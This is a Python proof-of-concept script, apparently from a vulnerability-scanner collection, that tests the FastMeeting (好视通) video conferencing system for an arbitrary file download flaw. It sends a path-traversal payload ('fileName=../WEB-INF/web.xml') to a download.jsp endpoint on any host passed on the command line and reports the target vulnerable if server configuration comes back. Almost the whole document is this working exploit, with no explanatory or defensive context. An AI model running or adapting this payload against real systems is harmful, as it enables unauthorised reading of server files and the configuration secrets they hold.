#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 好视通视频会议系统(fastmeeting)任意文件遍历
referer: http://www.wooyun.org/bugs/wooyun-2010-0143719
author: Lucifer
description: 文件/dbbackup/adminMgr/download.jsp中,参数fileName存在任意文件下载。
'''
import sys
import requests



class fastmeeting_download_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/dbbackup/adminMgr/download.jsp?fileName=../WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                return "[+]存在好视通视频会议系统(fastmeeting)任意文件下载漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = fastmeeting_download_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()